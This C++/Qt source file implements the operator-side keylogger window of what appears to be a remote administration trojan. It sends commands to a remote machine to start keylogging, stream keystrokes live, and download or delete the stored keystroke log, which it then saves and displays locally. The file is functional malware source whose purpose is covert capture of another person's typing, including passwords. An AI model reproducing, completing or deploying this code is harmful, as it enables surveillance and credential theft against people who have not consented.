#include "keylogger.h"
#include "ui_keylogger.h"


keylogger::keylogger(server *recieved, QWidget *parent) :
    QWidget(parent), mainServer(recieved),
    ui(new Ui::keylogger)
{    
    this->setAttribute(Qt::WA_DeleteOnClose);
    ui->setupUi(this);
    this->setWindowTitle("Keylogger");
    this->setWindowFlags(Qt::WindowCloseButtonHint);
    this->setWindowModality(Qt::ApplicationModal);
    this->setFixedHeight(this->height());
    this->setFixedWidth(this->width());

    mainServer->connectMe(this);
    mainServer->sendCommand(QByteArray("keyLogger"));


    beingWritten = 0;
    fileSize = 0;
    bytesWritten = 0;


    ui->pushButton_3->setDisabled(true);
    ui->pushButton_4->setDisabled(true);
    ui->pushButton_5->setDisabled(true);

    beingWritten = 0;
}

void keylogger::dataAvailable(QByteArray input)
{
    QString temp(input);

    if(beingWritten == 1 || temp.startsWith("b"))
    {
        if (beingWritten == 0)
        {
            input.remove(0, temp.indexOf("file") + 4);

            qDebug() << "\nHeader recieved: " << temp;
            temp.remove(0, 1);
            QString size = temp.left(temp.indexOf("file"));
            temp.remove(QString("file"));
            temp.remove(size);
            fileSize = size.toInt();

            qDebug() << "\nHeader stripped: " << size;
            qDebug() << "\nInput stripped: " << input;

            beingWritten = 1;
            ui->pushButton->setDisabled(true);
            ui->pushButton_3->setEnabled(true);

            bytesWritten += input.size();
            myFile.write(input);

            if(fileSize == bytesWritten)
            {
                completeFiling();
            }
        }

        else
        {
            bytesWritten += input.size();
            myFile.write(input);

            if(fileSize == bytesWritten)
            {
                completeFiling();
            }
        }

        return;
    }

    else if(temp.startsWith("R*"))
    {
        temp.remove(0, 1);
        ui->textBrowser->setTextColor("red");
        ui->textBrowser->insertPlainText("\n\n" + temp + "\n\n");
        ui->textBrowser->moveCursor (QTextCursor::End);

        if(temp.startsWith("*Log deleted", Qt::CaseInsensitive))
        {
            ui->pushButton_2->setDisabled(true);
            ui->pushButton_4->setEnabled(true);
        }
    }

    else if(temp.startsWith("G*"))
    {
        temp.remove(0, 1);
        ui->textBrowser->setTextColor("green");
        ui->textBrowser->insertPlainText("\n\n" + temp + "\n\n");
        ui->textBrowser->moveCursor (QTextCursor::End);

        if(temp.startsWith("*New log created"))
        {
            ui->pushButton_4->setDisabled(true);
            ui->pushButton_2->setEnabled(true);
        }
    }

    else
    {
        if(temp.startsWith("["))
            ui->textBrowser->setTextColor("green");

        else
            ui->textBrowser->setTextColor("black");

        if(temp == QString("[Backspace]"))
            ui->textBrowser->textCursor().deletePreviousChar();

        else if(temp == QString("[Enter]"))
            ui->textBrowser->insertPlainText("\n");

        else
            ui->textBrowser->insertPlainText(temp);

        ui->textBrowser->moveCursor (QTextCursor::End);
    }
}

keylogger::~keylogger()
{
    mainServer->sendCommand(QByteArray("close"));

    if(myFile.isOpen())
        myFile.close();

    delete ui;
}

void keylogger::on_pushButton_clicked()
{
    fileName = QFileDialog::getSaveFileName(this, tr("Get Log"),"/home", tr("Text Files (*.txt)"));
    myFile.setFileName(fileName);
    if(myFile.open(QIODevice::WriteOnly))
        mainServer->sendCommand(QByteArray("getLog"));
}



void keylogger::on_pushButton_3_clicked()
{
    myFile.flush();
    myFile.close();
    mainServer->disconnectMine();
}

void keylogger::on_pushButton_2_clicked()
{
   mainServer->sendCommand(QByteArray("deleteLog"));
}


void keylogger::completeFiling()
{
    ui->pushButton->setEnabled(true);
    ui->pushButton_3->setDisabled(true);

    beingWritten = 0;
    fileSize = 0;
    bytesWritten = 0;

    myFile.flush();
    myFile.close();

    ui->pushButton_5->setEnabled(true);
}

void keylogger::on_pushButton_4_clicked()
{
    mainServer->sendCommand(QByteArray("createLog"));
}

void keylogger::on_pushButton_5_clicked()
{
    QFile myFile(fileName);

    myFile.open(QIODevice::ReadOnly);

    ui->textBrowser->setTextColor("green");

    ui->textBrowser->insertPlainText("\n\nDownloaded log opened. Contents: \n");

    ui->textBrowser->setTextColor("purple");

    ui->textBrowser->insertPlainText(myFile.readAll());

    ui->textBrowser->insertPlainText("\n\n\n");

    ui->textBrowser->moveCursor (QTextCursor::End);
}

void keylogger::on_pushButton_6_clicked()
{
    ui->textBrowser->clear();
}
